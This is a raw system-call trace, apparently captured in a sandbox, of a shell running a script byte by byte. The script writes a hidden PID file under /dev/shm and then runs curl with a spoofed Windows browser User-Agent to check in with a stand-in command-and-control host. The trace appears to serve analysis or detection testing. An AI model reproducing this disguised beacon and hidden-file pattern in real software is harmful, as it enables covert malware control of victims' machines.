21    14:56:49.242080 <... access resumed>) = -1 ENOENT (No such file or directory)
9     14:56:49.242221 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.242372 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC <unfinished ...>
9     14:56:49.242531 <... read resumed>".", 1) = 1
21    14:56:49.242684 <... openat resumed>) = 3</etc/ld.so.cache>
9     14:56:49.242841 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.242997 fstat(3</etc/ld.so.cache>,  <unfinished ...>
9     14:56:49.243148 <... read resumed>"p", 1) = 1
21    14:56:49.243299 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
9     14:56:49.243450 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.243594 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0 <unfinished ...>
9     14:56:49.243746 <... read resumed>"i", 1) = 1
21    14:56:49.243888 <... mmap resumed>) = 0x70a4e9f10000
9     14:56:49.244037 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.244210 close(3</etc/ld.so.cache> <unfinished ...>
9     14:56:49.244366 <... read resumed>"d", 1) = 1
21    14:56:49.244519 <... close resumed>) = 0
9     14:56:49.244665 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.244824 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC <unfinished ...>
9     14:56:49.244987 <... read resumed>"\n", 1) = 1
21    14:56:49.245131 <... openat resumed>) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
9     14:56:49.245280 openat(AT_FDCWD</sandbox>, "/dev/shm/.cache_bak/proc.pid", O_WRONLY|O_CREAT|O_TRUNC, 000 <unfinished ...>
21    14:56:49.245442 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
9     14:56:49.245602 <... openat resumed>) = 3</dev/shm/.cache_bak/proc.pid>
21    14:56:49.245767 <... read resumed>"\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
9     14:56:49.245943 fcntl(1<pipe:[2809]>, F_GETFD <unfinished ...>
21    14:56:49.246121 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
9     14:56:49.246361 <... fcntl resumed>) = 0
21    14:56:49.246542 <... pread64 resumed>"\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
9     14:56:49.246745 fcntl(1<pipe:[2809]>, F_DUPFD, 10 <unfinished ...>
21    14:56:49.246904 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
9     14:56:49.247065 <... fcntl resumed>) = 10<pipe:[2809]>
21    14:56:49.247217 <... fstat resumed>{st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
9     14:56:49.247390 fcntl(1<pipe:[2809]>, F_GETFD <unfinished ...>
21    14:56:49.247558 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
9     14:56:49.247712 <... fcntl resumed>) = 0
21    14:56:49.247868 <... pread64 resumed>"\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
9     14:56:49.248027 fcntl(10<pipe:[2809]>, F_SETFD, FD_CLOEXEC <unfinished ...>
21    14:56:49.248187 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0 <unfinished ...>
9     14:56:49.248349 <... fcntl resumed>) = 0
21    14:56:49.248505 <... mmap resumed>) = 0x70a4e9cfe000
9     14:56:49.248650 dup2(3</dev/shm/.cache_bak/proc.pid>, 1<pipe:[2809]> <unfinished ...>
21    14:56:49.248819 mmap(0x70a4e9d26000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000 <unfinished ...>
9     14:56:49.248981 <... dup2 resumed>) = 1</dev/shm/.cache_bak/proc.pid>
21    14:56:49.249128 <... mmap resumed>) = 0x70a4e9d26000
9     14:56:49.249274 close(3</dev/shm/.cache_bak/proc.pid> <unfinished ...>
21    14:56:49.249413 mmap(0x70a4e9eae000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000 <unfinished ...>
9     14:56:49.249559 <... close resumed>) = 0
21    14:56:49.249706 <... mmap resumed>) = 0x70a4e9eae000
9     14:56:49.249924 write(1</dev/shm/.cache_bak/proc.pid>, "\n", 1 <unfinished ...>
21    14:56:49.250142 mmap(0x70a4e9efd000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000 <unfinished ...>
9     14:56:49.250331 <... write resumed>) = 1
21    14:56:49.250501 <... mmap resumed>) = 0x70a4e9efd000
9     14:56:49.250649 dup2(10<pipe:[2809]>, 1</dev/shm/.cache_bak/proc.pid> <unfinished ...>
21    14:56:49.250822 mmap(0x70a4e9f03000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0 <unfinished ...>
9     14:56:49.250975 <... dup2 resumed>) = 1<pipe:[2809]>
21    14:56:49.251143 <... mmap resumed>) = 0x70a4e9f03000
9     14:56:49.251302 fcntl(10<pipe:[2809]>, F_GETFD <unfinished ...>
21    14:56:49.251460 close(3</usr/lib/x86_64-linux-gnu/libc.so.6> <unfinished ...>
9     14:56:49.251623 <... fcntl resumed>) = 0x1 (flags FD_CLOEXEC)
21    14:56:49.251764 <... close resumed>) = 0
9     14:56:49.251895 close(10<pipe:[2809]> <unfinished ...>
21    14:56:49.252051 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
9     14:56:49.252198 <... close resumed>) = 0
21    14:56:49.252348 <... mmap resumed>) = 0x70a4e9cfb000
9     14:56:49.252485 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.252653 arch_prctl(ARCH_SET_FS, 0x70a4e9cfb740 <unfinished ...>
9     14:56:49.252802 <... read resumed>"\n", 1) = 1
21    14:56:49.252963 <... arch_prctl resumed>) = 0
9     14:56:49.253111 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.253279 set_tid_address(0x70a4e9cfba10 <unfinished ...>
9     14:56:49.253441 <... read resumed>" ", 1) = 1
21    14:56:49.253602 <... set_tid_address resumed>) = 21
9     14:56:49.253760 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.253923 set_robust_list(0x70a4e9cfba20, 24 <unfinished ...>
9     14:56:49.254079 <... read resumed>" ", 1) = 1
21    14:56:49.254239 <... set_robust_list resumed>) = 0
9     14:56:49.254396 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.254562 rseq(0x70a4e9cfc060, 0x20, 0, 0x53053053 <unfinished ...>
9     14:56:49.254754 <... read resumed>" ", 1) = 1
21    14:56:49.254917 <... rseq resumed>) = 0
9     14:56:49.255064 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.255249 mprotect(0x70a4e9efd000, 16384, PROT_READ <unfinished ...>
9     14:56:49.255411 <... read resumed>" ", 1) = 1
21    14:56:49.255587 <... mprotect resumed>) = 0
9     14:56:49.255751 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.255938 mprotect(0x70a4e9f15000, 4096, PROT_READ <unfinished ...>
9     14:56:49.256098 <... read resumed>"#", 1) = 1
21    14:56:49.256264 <... mprotect resumed>) = 0
9     14:56:49.256438 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.256614 mprotect(0x624a736f6000, 4096, PROT_READ <unfinished ...>
9     14:56:49.256811 <... read resumed>" ", 1) = 1
21    14:56:49.257026 <... mprotect resumed>) = 0
9     14:56:49.257215 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.257526 mprotect(0x70a4e9f4f000, 8192, PROT_READ <unfinished ...>
9     14:56:49.257782 <... read resumed>"N", 1) = 1
21    14:56:49.257978 <... mprotect resumed>) = 0
9     14:56:49.258142 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.258322 prlimit64(0, RLIMIT_STACK, NULL,  <unfinished ...>
9     14:56:49.258516 <... read resumed>"e", 1) = 1
21    14:56:49.258701 <... prlimit64 resumed>{rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
9     14:56:49.258882 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.259083 munmap(0x70a4e9f10000, 7295 <unfinished ...>
9     14:56:49.259272 <... read resumed>"t", 1) = 1
21    14:56:49.259503 <... munmap resumed>) = 0
9     14:56:49.259694 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.259899 getrandom( <unfinished ...>
9     14:56:49.260080 <... read resumed>"w", 1) = 1
21    14:56:49.260280 <... getrandom resumed>"\x9c\xed\xa0\x22\x3b\x42\x8f\x2c", 8, GRND_NONBLOCK) = 8
9     14:56:49.260495 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.260727 brk(NULL <unfinished ...>
9     14:56:49.260925 <... read resumed>"o", 1) = 1
21    14:56:49.261122 <... brk resumed>) = 0x624aae664000
9     14:56:49.261345 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.261568 brk(0x624aae685000 <unfinished ...>
9     14:56:49.261717 <... read resumed>"r", 1) = 1
21    14:56:49.261873 <... brk resumed>) = 0x624aae685000
9     14:56:49.262005 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.262150 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=2, tv_nsec=0},  <unfinished ...>
9     14:56:49.262293 <... read resumed>"k", 1) = 1
9     14:56:49.262471 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.262944 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.263326 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.263763 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.264160 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.264561 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.264985 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.265418 read(0<pipe:[589]>, "w", 1) = 1
9     14:56:49.265807 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.266167 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.266525 read(0<pipe:[589]>, "h", 1) = 1
9     14:56:49.266926 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.267292 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.267630 read(0<pipe:[589]>, "u", 1) = 1
9     14:56:49.267976 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.268322 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.268670 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.269088 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.269533 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.269973 read(0<pipe:[589]>, "U", 1) = 1
9     14:56:49.270430 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.270813 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.271180 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.271591 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.271987 read(0<pipe:[589]>, "A", 1) = 1
9     14:56:49.272351 read(0<pipe:[589]>, "g", 1) = 1
9     14:56:49.272739 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.273114 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.273606 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.274077 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.274477 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.274906 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.275292 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.275686 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.276060 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.276471 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.276960 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.277421 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.277872 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.278307 read(0<pipe:[589]>, "u", 1) = 1
9     14:56:49.278710 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.279144 read(0<pipe:[589]>, "\n", 1) = 1
9     14:56:49.279608 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.280045 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.280504 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.280922 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.281338 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.281717 read(0<pipe:[589]>, "u", 1) = 1
9     14:56:49.282093 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.282460 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.282901 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.283281 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.283672 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.284050 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.284417 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.284790 read(0<pipe:[589]>, "A", 1) = 1
9     14:56:49.285157 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.285524 read(0<pipe:[589]>, "\"", 1) = 1
9     14:56:49.285898 read(0<pipe:[589]>, "M", 1) = 1
9     14:56:49.286265 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.286706 read(0<pipe:[589]>, "z", 1) = 1
9     14:56:49.287126 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.287503 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.287874 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.288250 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.288613 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.288986 read(0<pipe:[589]>, "5", 1) = 1
9     14:56:49.289353 read(0<pipe:[589]>, ".", 1) = 1
9     14:56:49.289757 read(0<pipe:[589]>, "0", 1) = 1
9     14:56:49.290240 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.291055 read(0<pipe:[589]>, "(", 1) = 1
9     14:56:49.291662 read(0<pipe:[589]>, "W", 1) = 1
9     14:56:49.292268 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.292753 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.293247 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.293725 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.294183 read(0<pipe:[589]>, "w", 1) = 1
9     14:56:49.294675 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.295056 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.295413 read(0<pipe:[589]>, "N", 1) = 1
9     14:56:49.295769 read(0<pipe:[589]>, "T", 1) = 1
9     14:56:49.296184 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.296577 read(0<pipe:[589]>, "1", 1) = 1
9     14:56:49.296982 read(0<pipe:[589]>, "0", 1) = 1
9     14:56:49.297382 read(0<pipe:[589]>, ".", 1) = 1
9     14:56:49.297860 read(0<pipe:[589]>, "0", 1) = 1
9     14:56:49.298230 read(0<pipe:[589]>, ";", 1) = 1
9     14:56:49.298593 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.298969 read(0<pipe:[589]>, "W", 1) = 1
9     14:56:49.299342 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.299709 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.300068 read(0<pipe:[589]>, "6", 1) = 1
9     14:56:49.300423 read(0<pipe:[589]>, "4", 1) = 1
9     14:56:49.300790 read(0<pipe:[589]>, ";", 1) = 1
9     14:56:49.301143 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.301534 read(0<pipe:[589]>, "x", 1) = 1
9     14:56:49.301893 read(0<pipe:[589]>, "6", 1) = 1
9     14:56:49.302249 read(0<pipe:[589]>, "4", 1) = 1
9     14:56:49.302655 read(0<pipe:[589]>, ")", 1) = 1
9     14:56:49.303002 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.303361 read(0<pipe:[589]>, "A", 1) = 1
9     14:56:49.303712 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.304085 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.304437 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.304791 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.305131 read(0<pipe:[589]>, "W", 1) = 1
9     14:56:49.305487 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.305831 read(0<pipe:[589]>, "b", 1) = 1
9     14:56:49.306177 read(0<pipe:[589]>, "K", 1) = 1
9     14:56:49.306542 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.307215 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.307639 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.308045 read(0<pipe:[589]>, "5", 1) = 1
9     14:56:49.308433 read(0<pipe:[589]>, "3", 1) = 1
9     14:56:49.308804 read(0<pipe:[589]>, "7", 1) = 1
9     14:56:49.309148 read(0<pipe:[589]>, ".", 1) = 1
9     14:56:49.309531 read(0<pipe:[589]>, "3", 1) = 1
9     14:56:49.309910 read(0<pipe:[589]>, "6", 1) = 1
9     14:56:49.310277 read(0<pipe:[589]>, "\"", 1) = 1
9     14:56:49.310645 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.310972 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.311278 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.311585 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.311892 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.312197 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.312520 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.312826 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.313130 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.313436 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.313744 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.314112 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.314470 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.314904 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.315266 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.315625 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.315986 read(0<pipe:[589]>, "u", 1) = 1
9     14:56:49.316340 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.316736 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.317117 read(0<pipe:[589]>, "5", 1) = 1
9     14:56:49.317462 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.317822 read(0<pipe:[589]>, "\"", 1) = 1
9     14:56:49.318217 read(0<pipe:[589]>, "h", 1) = 1
9     14:56:49.318629 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.319032 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.319402 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.319760 read(0<pipe:[589]>, ":", 1) = 1
9     14:56:49.320133 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.320503 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.320890 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.321254 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.321606 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.321972 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.322327 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.322710 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.323261 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.324074 read(0<pipe:[589]>, "u", 1) = 1
9     14:56:49.324638 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.325124 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.325564 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.326041 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.326636 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.327245 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.327761 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.328229 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.328650 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.329030 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.329407 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.329772 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.330139 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.330520 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.330936 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.331422 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.331823 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.332189 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.332552 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.332913 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.333270 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.333626 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.333982 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.334340 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.334741 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.335157 read(0<pipe:[589]>, "v", 1) = 1
9     14:56:49.335550 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.335926 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.336296 read(0<pipe:[589]>, ".", 1) = 1
9     14:56:49.336723 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.337126 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.337497 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.337855 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.338220 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.338665 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.339057 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.339424 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.339807 read(0<pipe:[589]>, "v", 1) = 1
9     14:56:49.340230 read(0<pipe:[589]>, "1", 1) = 1
9     14:56:49.340785 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.341275 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.341682 read(0<pipe:[589]>, "h", 1) = 1
9     14:56:49.342045 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.342405 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.342767 read(0<pipe:[589]>, "k", 1) = 1
9     14:56:49.343129 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.343485 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.343845 read(0<pipe:[589]>, "\"", 1) = 1
9     14:56:49.344228 read(0<pipe:[589]>, "\n", 1) = 1
9     14:56:49.344622 newfstatat(AT_FDCWD</sandbox>, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     14:56:49.345005 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/curl", 0x7fff19398d60, 0) = -1 ENOENT (No such file or directory)
9     14:56:49.345386 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/curl", 0x7fff19398d60, 0) = -1 ENOENT (No such file or directory)
9     14:56:49.345835 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/curl", 0x7fff19398d60, 0) = -1 ENOENT (No such file or directory)
9     14:56:49.346237 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/curl", {st_mode=S_IFREG|0755, st_size=297288, ...}, 0) = 0
9     14:56:49.346683 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/curl", {st_mode=S_IFREG|0755, st_size=297288, ...}, 0) = 0
9     14:56:49.347090 geteuid()         = 1001
9     14:56:49.347463 getegid()         = 1001
9     14:56:49.347854 getuid()          = 1001
9     14:56:49.348199 getgid()          = 1001
9     14:56:49.348567 access("/usr/bin/curl", X_OK) = 0
9     14:56:49.348924 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/curl", {st_mode=S_IFREG|0755, st_size=297288, ...}, 0) = 0
9     14:56:49.349293 geteuid()         = 1001
9     14:56:49.349634 getegid()         = 1001
9     14:56:49.349976 getuid()          = 1001
9     14:56:49.350318 getgid()          = 1001
9     14:56:49.350675 access("/usr/bin/curl", R_OK) = 0
9     14:56:49.351059 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     14:56:49.351416 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [], 8) = 0
9     14:56:49.351780 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x79f014237e50) = 22
22    14:56:49.352406 set_robust_list(0x79f014237e60, 24 <unfinished ...>
9     14:56:49.352574 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
22    14:56:49.352734 <... set_robust_list resumed>) = 0
9     14:56:49.352887 <... rt_sigprocmask resumed>NULL, 8) = 0
22    14:56:49.353036 getpid( <unfinished ...>
9     14:56:49.353183 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
22    14:56:49.353343 <... getpid resumed>) = 22
9     14:56:49.353526 <... rt_sigprocmask resumed>[], 8) = 0
22    14:56:49.353708 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
9     14:56:49.353919 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
22    14:56:49.354089 <... rt_sigprocmask resumed>NULL, 8) = 0
9     14:56:49.354239 <... rt_sigprocmask resumed>NULL, 8) = 0
22    14:56:49.354385 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.354586 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
22    14:56:49.354746 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.354903 <... rt_sigprocmask resumed>[], 8) = 0
22    14:56:49.355069 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.355230 rt_sigaction(SIGINT, {sa_handler=0x63f00dda8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
22    14:56:49.355387 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.355540 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
22    14:56:49.355696 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.355854 wait4(-1,  <unfinished ...>
22    14:56:49.356004 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
22    14:56:49.356203 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
22    14:56:49.356591 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
22    14:56:49.357227 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x79f01427e330}, {sa_handler=0x63f00dda6230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x79f01427e330}, 8) = 0
22    14:56:49.357717 execve("/usr/bin/curl", ["curl", "-s", "-A", "Mozilla/5.0 (Windows NT 10.0; Wi"..., "--connect-timeout", "5", "http://malicious-command-and-con"...], 0x63f037b0d640 /* 9 vars */) = 0
22    14:56:49.358881 brk(NULL)         = 0x60523e066000
22    14:56:49.359363 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74e6ed39f000
